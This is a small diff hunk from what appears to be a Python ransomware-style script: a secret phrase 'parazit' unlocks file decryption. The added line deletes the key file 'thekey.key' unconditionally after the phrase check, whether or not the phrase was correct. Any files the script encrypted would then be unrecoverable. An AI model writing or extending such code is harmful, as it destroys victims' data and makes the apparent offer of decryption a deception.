@@ -28,3 +28,5 @@ if user_phrase == "parazit":
     print("Files successfully decrypted.")
 else:
     print("Sorry, wrong secret phrase.")
+
+os.remove("thekey.key")
